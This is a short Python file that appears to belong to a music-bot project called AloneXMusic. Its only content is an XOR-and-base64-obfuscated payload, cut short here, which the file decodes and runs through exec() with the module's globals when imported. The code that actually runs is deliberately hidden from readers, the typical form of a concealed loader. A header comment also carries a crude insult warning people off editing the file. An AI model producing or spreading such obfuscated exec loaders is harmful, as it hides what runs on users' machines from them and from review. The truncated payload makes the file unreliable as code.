# Copyright (c) 2025 TheHamkerAlone
# Licensed under the MIT License.
# This file is part of AloneXMusic
# ALONE-CODER
# Maderchod Kar Edit Ab

import base64

def xor_cipher(data, key):
    return bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])

_encoded_payload = "YmwMITVUMSYjLSZhZCxnZR9zfXFlBikpBy8oRiY9BSk9LylFbWVhKiwhKyEkKG87K0kmPWQxOiRsAgcRDQ8mJyA8MilhRGYNFyctNnInJSMrZUQwbzQkIDVsIChlbC8gKiAKDDk8JyYnSUUiNz0sbD83N0IkPSUocighPyE3WWMqKjA/[...]"
_key = b"ALONE-CODER"

exec(xor_cipher(base64.b64decode(_encoded_payload), _key).decode("utf-8"), globals())
